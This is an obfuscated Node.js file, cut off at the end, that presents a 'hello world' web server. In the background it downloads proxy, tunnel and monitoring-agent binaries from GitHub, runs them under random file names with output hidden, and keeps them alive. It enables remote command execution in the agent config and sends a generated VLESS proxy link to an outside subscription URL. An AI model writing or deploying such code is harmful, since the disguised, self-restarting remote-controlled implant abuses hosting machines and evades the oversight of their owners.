const _0x4f95f8=_0x12b3;(function(_0x32ab74,_0x105f54){const _0x284e24=_0x12b3,_0x4b5578=_0x32ab74();while(!![]){try{const _0x261321=-parseInt(_0x284e24(0x1da))/0x1*(-parseInt(_0x284e24(0x18d))/0x2)+-parseInt(_0x284e24(0x18f))/0x3+parseInt(_0x284e24(0x1fb))/0x4*(-parseInt(_0x284e24(0x1f4))/0x5)+parseInt(_0x284e24(0x199))/0x6+parseInt(_0x284e24(0x15a))/0x7*(-parseInt(_0x284e24(0x1f2))/0x8)+-parseInt(_0x284e24(0x177))/0x9+parseInt(_0x284e24(0x1c5))/0xa;if(_0x261321===_0x105f54)break;else _0x4b5578['push'](_0x4b5578['shift']());}catch(_0x5632f0){_0x4b5578['push'](_0x4b5578['shift']());}}}(_0x51a2,0x4156b));const FILE_PATH=process[_0x4f95f8(0x20b)][_0x4f95f8(0x149)]||_0x4f95f8(0x1d4),intervalInseconds=process[_0x4f95f8(0x20b)][_0x4f95f8(0x209)]||0x64,CFIP=process[_0x4f95f8(0x20b)][_0x4f95f8(0x155)]||_0x4f95f8(0x147),CFPORT=process[_0x4f95f8(0x20b)][_0x4f95f8(0x1de)]||_0x4f95f8(0x15f),delay=_0x489e92=>new Promise(_0x26c4ae=>setTimeout(_0x26c4ae,_0x489e92)),OPENSERVER=(process[_0x4f95f8(0x20b)][_0x4f95f8(0x207)]||'true')==='true',KEEPALIVE=(process['env'][_0x4f95f8(0x1a7)]||_0x4f95f8(0x20c))===_0x4f95f8(0x152),MY_DOMAIN=process[_0x4f95f8(0x20b)][_0x4f95f8(0x14d)]||'',ARGO_DOMAIN=process[_0x4f95f8(0x20b)]['ARGO_DOMAIN']||'',ARGO_AUTH=process[_0x4f95f8(0x20b)][_0x4f95f8(0x175)]||'',VLPATH=process[_0x4f95f8(0x20b)]['VLPATH']||'',XHPPATH=process[_0x4f95f8(0x20b)][_0x4f95f8(0x1e4)]||'',PORT=process[_0x4f95f8(0x20b)][_0x4f95f8(0x198)]||process[_0x4f95f8(0x20b)]['SERVER_PORT']||0xbb8,V_PORT=process[_0x4f95f8(0x20b)][_0x4f95f8(0x1f0)]||0x1f90,UUID=process[_0x4f95f8(0x20b)][_0x4f95f8(0x165)]||'',NEZHA_VERSION=process[_0x4f95f8(0x20b)][_0x4f95f8(0x1ad)]||'V0',NEZHA_SERVER=process[_0x4f95f8(0x20b)][_0x4f95f8(0x1f1)]||'',NEZHA_PORT=process[_0x4f95f8(0x20b)]['NEZHA_PORT']||_0x4f95f8(0x15f),NEZHA_KEY=process[_0x4f95f8(0x20b)][_0x4f95f8(0x180)]||'',SUB_NAME=process[_0x4f95f8(0x20b)][_0x4f95f8(0x1f5)]||'',SUB_URL=process['env'][_0x4f95f8(0x1ca)]||'',axios=require(_0x4f95f8(0x1f3)),{pipeline}=require('stream/promises'),os=require('os'),fs=require('fs'),path=require(_0x4f95f8(0x1c9)),http=require('http'),https=require(_0x4f95f8(0x151)),exec=require(_0x4f95f8(0x205))[_0x4f95f8(0x196)];function createFolder(_0x3f97f9){const _0x13567b=_0x4f95f8;try{fs[_0x13567b(0x188)](_0x3f97f9),console[_0x13567b(0x1a3)](_0x3f97f9+_0x13567b(0x1a6));}catch(_0x283293){_0x283293[_0x13567b(0x14a)]===_0x13567b(0x169)?(fs[_0x13567b(0x1ed)](_0x3f97f9),console[_0x13567b(0x1a3)](_0x3f97f9+_0x13567b(0x1e3))):console['log'](_0x13567b(0x179)+FILE_PATH+':\x20'+error[_0x13567b(0x187)]);}}function httpserver(){const _0x44ec74=_0x4f95f8,_0x387559=http['createServer']((_0x4bcdeb,_0xd11e70)=>{const _0x18cb2c=_0x12b3;if(_0x4bcdeb[_0x18cb2c(0x1f8)]==='/')_0xd11e70[_0x18cb2c(0x1fe)](0xc8),_0xd11e70[_0x18cb2c(0x18a)]('hello\x20world');else{if(_0x4bcdeb[_0x18cb2c(0x1f8)]===_0x18cb2c(0x1a0)){const _0xcb4ef9=FILE_PATH+_0x18cb2c(0x192);fs[_0x18cb2c(0x171)](_0xcb4ef9,_0x18cb2c(0x158),(_0x3f7f7a,_0x107044)=>{const _0x45a8e9=_0x18cb2c;_0x3f7f7a?(_0xd11e70['writeHead'](0x1f4),_0xd11e70['end'](_0x45a8e9(0x176))):(_0xd11e70['writeHead'](0xc8,{'Content-Type':_0x45a8e9(0x164)}),_0xd11e70['end'](_0x107044));});}else _0xd11e70['writeHead'](0x194),_0xd11e70['end'](_0x18cb2c(0x17f));}});_0x387559[_0x44ec74(0x18e)](PORT,()=>{const _0x2bd2b6=_0x44ec74;console[_0x2bd2b6(0x1a3)](_0x2bd2b6(0x154)+PORT);});}function _0x12b3(_0x374476,_0x26eb6a){const _0x51a23b=_0x51a2();return _0x12b3=function(_0x12b369,_0x535783){_0x12b369=_0x12b369-0x147;let _0x53f413=_0x51a23b[_0x12b369];return _0x53f413;},_0x12b3(_0x374476,_0x26eb6a);}function execPromise(_0x24fe57,_0x4841e2={}){return new Promise((_0x26ddac,_0x38e2a8)=>{const _0x209a82=exec(_0x24fe57,_0x4841e2,(_0x3c25ce,_0x3a7cbb,_0x5cfcbc)=>{const _0x7c8770=_0x12b3;if(_0x3c25ce){const _0xe69d06=new Error(_0x7c8770(0x150)+_0x3c25ce[_0x7c8770(0x187)]);_0xe69d06[_0x7c8770(0x14a)]=_0x3c25ce['code'],_0xe69d06['stderr']=_0x5cfcbc[_0x7c8770(0x1ea)](),_0x38e2a8(_0xe69d06);}else _0x26ddac(_0x3a7cbb[_0x7c8770(0x1ea)]());});});}async function detectProcess(_0x53c505){const _0x238b5e=_0x4f95f8,_0x452ef9=[{'cmd':_0x238b5e(0x190)+_0x53c505+'\x22','name':_0x238b5e(0x1b6)},{'cmd':_0x238b5e(0x1db)+_0x53c505+'\x22','name':_0x238b5e(0x1ee)},{'cmd':_0x238b5e(0x1b1)+_0x53c505+'\x22\x20\x27$2\x20==\x20name\x20{print\x20$1}\x27','name':_0x238b5e(0x1e2)}];for(const _0x37c8a9 of _0x452ef9){try{const _0x4268b2=await execPromise(_0x37c8a9[_0x238b5e(0x1d2)]);if(_0x4268b2)return _0x4268b2[_0x238b5e(0x19c)](/\n/g,'\x20')[_0x238b5e(0x1ea)]();}catch(_0x568480){_0x568480[_0x238b5e(0x14a)]!==0x7f&&_0x568480['code']!==0x1&&console[_0x238b5e(0x17c)](_0x238b5e(0x1d9)+_0x37c8a9[_0x238b5e(0x1e9)]+_0x238b5e(0x17e),_0x568480['message']);}}return'';}async function killProcess(_0x3db8a8){const _0x36b055=_0x4f95f8;console[_0x36b055(0x1a3)](_0x36b055(0x14e)+_0x3db8a8);try{const _0x2e69e1=await detectProcess(_0x3db8a8);if(!_0x2e69e1)return console['warn'](_0x36b055(0x157)+_0x3db8a8+_0x36b055(0x1bd)),{'success':!![],'message':_0x36b055(0x16d)};await execPromise(_0x36b055(0x1df)+_0x2e69e1);const _0xb8e0c0=_0x36b055(0x186)+_0x2e69e1+')';return console[_0x36b055(0x1a3)](_0xb8e0c0),{'success':!![],'message':_0xb8e0c0};}catch(_0x5b5215){const _0x1801fb=_0x36b055(0x1a8)+_0x5b5215[_0x36b055(0x187)];return console[_0x36b055(0x1bb)](_0x1801fb),{'success':![],'message':_0x1801fb};}}function generateRandomString(_0x545db1){const _0x35d64f=_0x4f95f8,_0x3a2570='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';let _0x36cc58='';for(let _0x1746ac=0x0;_0x1746ac<_0x545db1;_0x1746ac++){_0x36cc58+=_0x3a2570[_0x35d64f(0x14c)](Math[_0x35d64f(0x16f)](Math['random']()*_0x3a2570[_0x35d64f(0x18b)]));}return _0x36cc58;}async function myconfig(){const _0x3fa5cb=path['join'](FILE_PATH,'xconf'),_0x1e0b24='/'+VLPATH,_0x16a638='/'+XHPPATH;function _0x19353c(){const _0x1f9534=_0x12b3,_0x44470a={'log':{'access':_0x1f9534(0x1dc),'error':_0x1f9534(0x1dc),'loglevel':_0x1f9534(0x156)},'dns':{'servers':[_0x1f9534(0x178)]}};fs[_0x1f9534(0x1ef)](path['join'](_0x3fa5cb,_0x1f9534(0x168)),JSON[_0x1f9534(0x1d3)](_0x44470a,null,0x2));if(VLPATH&&!XHPPATH){const _0x423b01={'inbounds':[{'port':V_PORT,'listen':'::','protocol':_0x1f9534(0x195),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x1f9534(0x156),'wsSettings':{'path':_0x1e0b24}},'sniffing':{'enabled':!![],'destOverride':[_0x1f9534(0x1e0),_0x1f9534(0x1fa),'quic'],'metadataOnly':![]}}]};fs[_0x1f9534(0x1ef)](path[_0x1f9534(0x1ba)](_0x3fa5cb,_0x1f9534(0x1a2)),JSON[_0x1f9534(0x1d3)](_0x423b01,null,0x2));}else{if(XHPPATH&&!VLPATH){const _0xb3f74c={'inbounds':[{'port':V_PORT,'listen':'::','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x1f9534(0x156)},'streamSettings':{'network':_0x1f9534(0x1cf),'security':'none','xhttpSettings':{'mode':'packet-up','path':_0x16a638}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1f9534(0x1fa),_0x1f9534(0x19e)],'metadataOnly':![]}}]};fs[_0x1f9534(0x1ef)](path[_0x1f9534(0x1ba)](_0x3fa5cb,_0x1f9534(0x1a2)),JSON[_0x1f9534(0x1d3)](_0xb3f74c,null,0x2));}}const _0x2f493c={'outbounds':[{'tag':'direct','protocol':_0x1f9534(0x161)},{'tag':_0x1f9534(0x191),'protocol':'blackhole'}]};fs[_0x1f9534(0x1ef)](path[_0x1f9534(0x1ba)](_0x3fa5cb,'outbound.json'),JSON[_0x1f9534(0x1d3)](_0x2f493c,null,0x2));}_0x19353c();}function getSystemArchitecture(){const _0x566804=_0x4f95f8,_0x43f553=os[_0x566804(0x1a5)]();return _0x43f553===_0x566804(0x16e)||_0x43f553===_0x566804(0x19f)||_0x43f553===_0x566804(0x1d1)?_0x566804(0x16e):_0x566804(0x167);}function getFilesForArchitecture(_0x3caef5){const _0x10ecd8=_0x4f95f8,_0x41337b={'bot':{'arm':_0x10ecd8(0x1fc),'amd':_0x10ecd8(0x174)},'web':{'arm':_0x10ecd8(0x1aa),'amd':'https://github.com/mytcgd/myfiles/releases/download/main/xray'},'npm':{'V0':{'arm':_0x10ecd8(0x1c8),'amd':_0x10ecd8(0x1c2)},'V1':{'arm':_0x10ecd8(0x182),'amd':_0x10ecd8(0x1b5)}}};let _0x1b5fa8=[{'fileName':generateRandomString(0x5),'originalName':_0x10ecd8(0x1bc),'fileUrl':_0x41337b['web'][_0x3caef5]}];if(OPENSERVER){const _0xf68198={'fileName':generateRandomString(0x5),'originalName':'bot','fileUrl':_0x41337b['bot'][_0x3caef5]};_0x1b5fa8[_0x10ecd8(0x1cb)](_0xf68198);}if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY&&NEZHA_VERSION){const _0xeb08ac={'fileName':generateRandomString(0x5),'originalName':_0x10ecd8(0x203),'fileUrl':_0x41337b[_0x10ecd8(0x203)][NEZHA_VERSION][_0x3caef5]};_0x1b5fa8[_0x10ecd8(0x1cb)](_0xeb08ac);}return _0x1b5fa8;}function _0x51a2(){const _0x41fcab=['\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','xhttp','chmodSync','aarch64','cmd','stringify','/tmp','from','/tunnel.yml\x20run','GET','\x0a\x20\x20\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','[detectProcess]\x20','20DMAyML','pgrep\x20-x\x20\x22','/dev/null','size','CFPORT','kill\x20-9\x20','http','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ps+awk','\x20is\x20created','XHPPATH','\x0a\x20\x20\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20\x20\x20\x20\x20\x20\x20','--tls','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20',',\x20response:\x20','name','trim','Error\x20reading\x20boot.log:','/xconf\x20>/dev/null\x202>&1\x20&','mkdirSync','pgrep','writeFileSync','V_PORT','NEZHA_SERVER','243296kQuzgr','axios','1285lbVgoI','SUB_NAME','pathname','vless://','url','&path=%2F','tls','1644gtcsHX','https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64','%3Fed%3D2560&type=ws&encryption=none&security=tls&sni=','writeHead','\x20-s\x20','\x20--report-delay=4\x20--skip-conn\x20--skip-procs\x20--disable-auto-update\x20>/dev/null\x202>&1\x20&','tunnel.json','tunnel.yml','npm','?encryption=none&security=tls&sni=','child_process','write','OPENSERVER','get','TIME','/meta','env','false','map','bot\x20file\x20not\x20found,\x20skip\x20running','Error\x20in\x20bot\x20process\x20management:','fileName','ip.sb','Can\x27t\x20determine\x20system\x20architecture.','FILE_PATH','code','speed.cloudflare.com','charAt','MY_DOMAIN','Attempting\x20to\x20kill\x20process:\x20','toString','Command\x20failed:\x20','https','true','statusCode','server\x20is\x20running\x20on\x20port\x20:\x20','CFIP','none','Process\x20\x27','utf8','rmSync','84mCPnPH','forEach','\x20>/dev/null\x202>&1\x20&','asOrganization','\x0a\x20\x20\x20\x20\x20\x20\x20\x20tunnel:\x20','443','xconf','freedom','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','POST','text/plain;\x20charset=utf-8','UUID','/xconf','amd','inbound.json','ENOENT','application/json;\x20charset=utf-8','\x20running\x20error:\x20','2096','Process\x20not\x20found','arm','floor','npm\x20variable\x20is\x20empty,\x20skip\x20running','readFile','\x20-c\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64','ARGO_AUTH','Error\x20reading\x20file','310212ECIeHI','https+local://8.8.8.8/dns-query','Error\x20handling\x20','HTTP\x20error!\x20status:\x20','/config.yml','debug','boot.log','\x20error:','Not\x20found','NEZHA_KEY','filePath','https://github.com/mytcgd/myfiles/releases/download/main/nezha-agentv1_arm','utf-8','Failed\x20to\x20obtain\x20ArgoDomain\x20even\x20after\x20restarting\x20bot.','\x20is\x20running','Killed\x20process\x20(PIDs:\x20','message','statSync','%3Fed%3D2560&mode=packet-up#','end','length','base64','27298IpZjwj','listen','599133ISSKjZ','pidof\x20\x22','block','/log.txt','unlinkSync','port','vless','exec','nohup\x20','PORT','3045420qEsbon','all','/config.yml\x20>/dev/null\x202>&1\x20&','replace','isDirectory','quic','arm64','/sub','2087','inbound_v.json','log','Error\x20downloading\x20files:','arch','\x20already\x20exists','KEEPALIVE','Kill\x20failed:\x20','npm\x20file\x20not\x20found,\x20skip\x20running','https://github.com/mytcgd/myfiles/releases/download/main/xray_arm','Upload\x20failed:','\x20-p\x20','NEZHA_VERSION','\x20run\x20-confdir\x20','fileUrl','createWriteStream','ps\x20-eo\x20pid,comm\x20|\x20awk\x20-v\x20name=\x22','\x0a\x20\x20\x20\x20\x20\x20\x20\x20protocol:\x20http2\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20ingress:\x0a\x20\x20\x20\x20\x20\x20\x20\x20-\x20hostname:\x20','parse','bot','https://github.com/mytcgd/myfiles/releases/download/main/nezha-agentv1','pidof','includes','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','No\x20domain\x20could\x20be\x20determined.\x20Cannot\x20construct\x20UPLOAD_DATA','join','error','web','\x27\x20not\x20found','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','hostname','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','data','https://github.com/kahunama/myfile/releases/download/main/nezha-agent','Error\x20checking\x20boot.log:\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','1918270PtKbAr','TunnelSecret','statusMessage','https://github.com/kahunama/myfile/releases/download/main/nezha-agent_arm','path','SUB_URL','push','originalName','?host='];_0x51a2=function(){return _0x41fcab;};return _0x51a2();}async function download_function(_0x365564,_0x533c84,_0x3f5d3d){const _0x6d275f=_0x4f95f8,_0x16c6d3=path[_0x6d275f(0x1ba)](FILE_PATH,_0x365564);let _0x46741d=![];try{const _0x5ed0f6=await axios({'method':_0x6d275f(0x208),'url':_0x3f5d3d,'responseType':'stream'});await pipeline(_0x5ed0f6[_0x6d275f(0x1c1)],fs[_0x6d275f(0x1b0)](_0x16c6d3)),_0x46741d=!![];}catch(_0x488d8f){}return{'fileName':_0x365564,'originalName':_0x533c84,'filePath':_0x16c6d3,'success':_0x46741d};}let fileMapping={};async function downloadFiles(){const _0x1d20d2=_0x4f95f8;try{const _0x460c36=getSystemArchitecture();if(!_0x460c36)return console[_0x1d20d2(0x1a3)](_0x1d20d2(0x148)),fileMapping;const _0x4ce73c=getFilesForArchitecture(_0x460c36);if(_0x4ce73c['length']===0x0)return console[_0x1d20d2(0x1a3)](_0x1d20d2(0x1be)),fileMapping;const _0x249eca=_0x4ce73c[_0x1d20d2(0x20d)](_0x32b479=>download_function(_0x32b479['fileName'],_0x32b479['originalName'],_0x32b479[_0x1d20d2(0x1af)])),_0x290b11=await Promise[_0x1d20d2(0x19a)](_0x249eca);return _0x290b11[_0x1d20d2(0x15b)](_0x20e57d=>{const _0x37ed3c=_0x1d20d2;if(_0x20e57d['success'])try{fs[_0x37ed3c(0x1d0)](_0x20e57d[_0x37ed3c(0x181)],0x1ed),fileMapping[_0x20e57d[_0x37ed3c(0x1cc)]]=_0x20e57d[_0x37ed3c(0x210)];}catch(_0x3d6de3){}}),fileMapping;}catch(_0x1da839){return console[_0x1d20d2(0x1bb)](_0x1d20d2(0x1a4),_0x1da839),fileMapping;}}function argoType(){const _0x370574=_0x4f95f8;if(!ARGO_AUTH||!ARGO_DOMAIN)return;if(ARGO_AUTH[_0x370574(0x1b7)](_0x370574(0x1c6))){fs[_0x370574(0x1ef)](path[_0x370574(0x1ba)](FILE_PATH,_0x370574(0x201)),ARGO_AUTH);const _0x481b71=_0x370574(0x15e)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20credentials-file:\x20'+path[_0x370574(0x1ba)](FILE_PATH,_0x370574(0x201))+_0x370574(0x1b2)+ARGO_DOMAIN+_0x370574(0x1d8)+V_PORT+_0x370574(0x1e5);fs[_0x370574(0x1ef)](path['join'](FILE_PATH,_0x370574(0x202)),_0x481b71);}else{}}let args;function get_cloud_flare_args(){const _0x20d08e=_0x4f95f8;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))args=_0x20d08e(0x162)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?args=_0x20d08e(0x1c4)+FILE_PATH+_0x20d08e(0x1d6):args=_0x20d08e(0x1b8)+FILE_PATH+_0x20d08e(0x1e1)+V_PORT;return args;}let NEZHA_TLS;function nezconfig(){const _0x332026=_0x4f95f8,_0x5b6885=['443','8443',_0x332026(0x16c),_0x332026(0x1a1),'2083','2053'];if(NEZHA_VERSION==='V0')return _0x5b6885['includes'](NEZHA_PORT)?NEZHA_TLS=_0x332026(0x1e6):NEZHA_TLS='',NEZHA_TLS;else{if(NEZHA_VERSION==='V1'){_0x5b6885[_0x332026(0x1b7)](NEZHA_PORT)?NEZHA_TLS=_0x332026(0x152):NEZHA_TLS=_0x332026(0x20c);const _0x32439b=path['join'](FILE_PATH,'/config.yml'),_0x206324='client_secret:\x20'+NEZHA_KEY+_0x332026(0x173)+NEZHA_SERVER+':'+NEZHA_PORT+_0x332026(0x1e7)+NEZHA_TLS+_0x332026(0x1ce)+UUID;try{fs[_0x332026(0x1ef)](_0x32439b,_0x206324);}catch(_0x3a0427){}}}}async function runbot(){const _0x271e6f=_0x4f95f8,_0x3f5460=path['join'](FILE_PATH,fileMapping['bot']);try{fs['statSync'](_0x3f5460);try{await execPromise(_0x271e6f(0x197)+FILE_PATH+'/'+fileMapping[_0x271e6f(0x1b4)]+'\x20'+args+_0x271e6f(0x15c));}catch(_0xeef17e){console[_0x271e6f(0x1bb)](fileMapping['bot']+'\x20running\x20error:\x20'+_0xeef17e);}}catch(_0x1e08b7){if(_0x1e08b7['code']===_0x271e6f(0x169))console[_0x271e6f(0x1a3)](_0x271e6f(0x20e));else{}}}async function runweb(){const _0x2eac3c=_0x4f95f8,_0x149efe=path[_0x2eac3c(0x1ba)](FILE_PATH,fileMapping['web']);try{fs['statSync'](_0x149efe);try{await execPromise(_0x2eac3c(0x197)+FILE_PATH+'/'+fileMapping[_0x2eac3c(0x1bc)]+_0x2eac3c(0x1ae)+FILE_PATH+_0x2eac3c(0x1ec));}catch(_0x163140){console['error'](fileMapping['web']+_0x2eac3c(0x16b)+_0x163140);}}catch(_0x583b75){if(_0x583b75[_0x2eac3c(0x14a)]===_0x2eac3c(0x169))console[_0x2eac3c(0x1a3)]('web\x20file\x20not\x20found,\x20skip\x20running');else{}}}async function runnpm(){const _0xcd0458=_0x4f95f8,_0x326d15=path['join'](FILE_PATH,fileMapping[_0xcd0458(0x203)]);try{fs['statSync'](_0x326d15);try{if(NEZHA_VERSION==='V0')await execPromise(_0xcd0458(0x197)+FILE_PATH+'/'+fileMapping[_0xcd0458(0x203)]+_0xcd0458(0x1ff)+NEZHA_SERVER+':'+NEZHA_PORT+_0xcd0458(0x1ac)+NEZHA_KEY+'\x20'+NEZHA_TLS+_0xcd0458(0x200));else NEZHA_VERSION==='V1'&&await execPromise(_0xcd0458(0x197)+FILE_PATH+'/'+fileMapping[_0xcd0458(0x203)]+_0xcd0458(0x172)+FILE_PATH+_0xcd0458(0x19b));}catch(_0xf3a22d){console[_0xcd0458(0x1bb)](fileMapping[_0xcd0458(0x203)]+'\x20running\x20error:\x20'+_0xf3a22d);}}catch(_0x1a35ed){if(_0x1a35ed[_0xcd0458(0x14a)]===_0xcd0458(0x169))console[_0xcd0458(0x1a3)](_0xcd0458(0x1a9));else{}}}async function runapp(){const _0x3928cd=_0x4f95f8;OPENSERVER?(argoType(),get_cloud_flare_args(),await runbot(),await delay(0x1388)):console[_0x3928cd(0x1a3)]('bot\x20variable\x20is\x20not\x20allowed,\x20skip\x20running'),await runweb(),await delay(0x3e8),NEZHA_VERSION&&NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY?(nezconfig(),await runnpm(),await delay(0x3e8)):console[_0x3928cd(0x1a3)](_0x3928cd(0x170));}async function keep_alive(){const _0xc3baf1=_0x4f95f8,_0x2adfb2=await detectProcess(''+fileMapping[_0xc3baf1(0x1bc)]);if(_0x2adfb2){}else await runweb();await delay(0x1388);if(OPENSERVER){const _0x53a179=await detectProcess(''+fileMapping[_0xc3baf1(0x1b4)]);if(_0x53a179){}else await runbot();}await delay(0x1388);if(NEZHA_VERSION&&NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1f72ac=await detectProcess(''+fileMapping[_0xc3baf1(0x203)]);if(_0x1f72ac){}else await runnpm();}}function getArgoDomainFromLog(){const _0x9e3c7f=_0x4f95f8,_0x43cad2=path[_0x9e3c7f(0x1ba)](FILE_PATH,_0x9e3c7f(0x17d));try{const _0x58a86e=fs['statSync'](_0x43cad2);if(_0x58a86e[_0x9e3c7f(0x1dd)]===0x0)return null;const _0x4e11f1=fs['readFileSync'](_0x43cad2,_0x9e3c7f(0x183)),_0x5e1e8c=/info.*https:\/\/(.*trycloudflare\.com)/g;let _0x3fe6f8,_0x29e5bc=null;while((_0x3fe6f8=_0x5e1e8c[_0x9e3c7f(0x196)](_0x4e11f1))!==null){_0x29e5bc=_0x3fe6f8[0x1];}return _0x29e5bc;}catch(_0x28dd31){if(_0x28dd31[_0x9e3c7f(0x14a)]===_0x9e3c7f(0x169))return null;return console[_0x9e3c7f(0x1bb)](_0x9e3c7f(0x1eb),_0x28dd31),null;}}function buildurl(_0x4c0def){const _0x39a934=_0x4f95f8;let _0x54723b='';if(VLPATH)_0x54723b=_0x39a934(0x1f7)+UUID+'@'+CFIP+':'+CFPORT+_0x39a934(0x1cd)+_0x4c0def+_0x39a934(0x1f9)+VLPATH+_0x39a934(0x1fd)+_0x4c0def+'#'+ISP+'-'+SUB_NAME;else XHPPATH&&(_0x54723b=_0x39a934(0x1f7)+UUID+'@'+CFIP+':'+CFPORT+_0x39a934(0x204)+_0x4c0def+'&type=xhttp&host='+_0x4c0def+'&path=%2F'+XHPPATH+_0x39a934(0x189)+ISP+'-'+SUB_NAME);return _0x54723b;}let argoDomain,UPLOAD_DATA;async function extractDomains(){const _0x3084d6=_0x4f95f8;let _0x48d481=null;if(OPENSERVER===!![]){if(ARGO_AUTH&&ARGO_DOMAIN)_0x48d481=ARGO_DOMAIN;else{await delay(0xbb8),_0x48d481=getArgoDomainFromLog();if(!_0x48d481)try{console[_0x3084d6(0x1a3)](_0x3084d6(0x1c0));const _0x3229e4=path['join'](FILE_PATH,_0x3084d6(0x17d));try{fs[_0x3084d6(0x188)](_0x3229e4);try{fs['unlinkSync'](_0x3229e4),await delay(0x1f4);}catch(_0x33bdae){console[_0x3084d6(0x1bb)]('Error\x20deleting\x20boot.log:\x20'+_0x33bdae);}}catch(_0x248eba){_0x248eba[_0x3084d6(0x14a)]!==_0x3084d6(0x169)&&console[_0x3084d6(0x1bb)](_0x3084d6(0x1c3)+_0x248eba);}const _0x5ba935=''+fileMapping[_0x3084d6(0x1b4)];await killProcess(_0x5ba935),await delay(0x3e8),await runbot(),console[_0x3084d6(0x1a3)](fileMapping[_0x3084d6(0x1b4)]+_0x3084d6(0x185)),await delay(0x2710),_0x48d481=getArgoDomainFromLog(),!_0x48d481&&console['error'](_0x3084d6(0x184));}catch(_0x311e7c){console[_0x3084d6(0x1bb)](_0x3084d6(0x20f),_0x311e7c);return;}else{}}}MY_DOMAIN&&(_0x48d481=MY_DOMAIN);argoDomain=_0x48d481;if(!argoDomain){console['error'](_0x3084d6(0x1b9)),UPLOAD_DATA='';return;}UPLOAD_DATA=buildurl(argoDomain);}async function getCloudflareMeta(){return new Promise((_0x269ec6,_0x4b3c17)=>{const _0x600a6f=_0x12b3,_0x374c21={'hostname':_0x600a6f(0x14b),'path':_0x600a6f(0x20a),'method':_0x600a6f(0x1d7)},_0x42715b=https['request'](_0x374c21,_0x1ed9f9=>{const _0x15aa07=_0x600a6f;let _0x52e93a='';_0x1ed9f9['on'](_0x15aa07(0x1c1),_0x730354=>{_0x52e93a+=_0x730354;}),_0x1ed9f9['on'](_0x15aa07(0x18a),()=>{const _0x3aa5eb=_0x15aa07,_0x2b4ef1=JSON[_0x3aa5eb(0x1b3)](_0x52e93a);_0x269ec6(_0x2b4ef1);});});_0x42715b['on'](_0x600a6f(0x1bb),_0x30f742=>{_0x4b3c17(_0x30f742);}),_0x42715b[_0x600a6f(0x18a)]();});}let ISP;async function getipandisp(){const _0x12864d=_0x4f95f8;let _0x7310eb=await getCloudflareMeta(),_0x113c68=_0x7310eb['country'],_0x49644e=_0x7310eb[_0x12864d(0x15d)];ISP=(_0x113c68+'-'+_0x49644e)[_0x12864d(0x19c)](/ /g,'_');}function generateLinks(){const _0x27c424=_0x4f95f8;if(UPLOAD_DATA){const _0xd8c6a1=path[_0x27c424(0x1ba)](FILE_PATH,'log.txt');fs[_0x27c424(0x1ef)](_0xd8c6a1,Buffer[_0x27c424(0x1d5)](UPLOAD_DATA)[_0x27c424(0x14f)](_0x27c424(0x18c)));}}async function uploadSubscription(_0x15c6a7,_0x4fa08b,_0x3fdfda){const _0x4e8e71=_0x4f95f8,_0x4416df=JSON[_0x4e8e71(0x1d3)]({'URL_NAME':_0x15c6a7,'URL':_0x4fa08b}),_0x337675=Buffer['from'](_0x4416df,_0x4e8e71(0x158)),_0xdaa129=_0x337675['length'],_0x42a2c1=new URL(_0x3fdfda),_0x1172d1={'hostname':_0x42a2c1[_0x4e8e71(0x1bf)],'port':_0x42a2c1[_0x4e8e71(0x194)]||0x1bb,'path':_0x42a2c1[_0x4e8e71(0x1f6)],'method':_0x4e8e71(0x163),'headers':{'Content-Type':_0x4e8e71(0x16a),'Content-Length':_0xdaa129}};try{const _0x88dd11=await new Promise((_0x1f7a2a,_0x196380)=>{const _0x2e2aec=_0x4e8e71,_0x219718=https['request'](_0x1172d1,_0x9a40d6=>{const _0x35fe29=_0x12b3;if(_0x9a40d6['statusCode']<0xc8||_0x9a40d6[_0x35fe29(0x153)]>=0x12c)return _0x196380(new Error(_0x35fe29(0x17a)+_0x9a40d6[_0x35fe29(0x153)]+_0x35fe29(0x1e8)+_0x9a40d6[_0x35fe29(0x1c7)]));let _0x186e8d='';_0x9a40d6['on']('data',_0x20e840=>_0x186e8d+=_0x20e840),_0x9a40d6['on']('end',()=>_0x1f7a2a(_0x186e8d));});_0x219718['on'](_0x2e2aec(0x1bb),_0x1ceb2b=>_0x196380(_0x1ceb2b)),_0x219718[_0x2e2aec(0x206)](_0x337675),_0x219718[_0x2e2aec(0x18a)]();});return _0x88dd11;}catch(_0x190046){console['error'](_0x4e8e71(0x1ab),_0x190046[_0x4e8e71(0x187)]);}}function cleanfiles(){setTimeout(()=>{const _0x11037e=_0x12b3;let 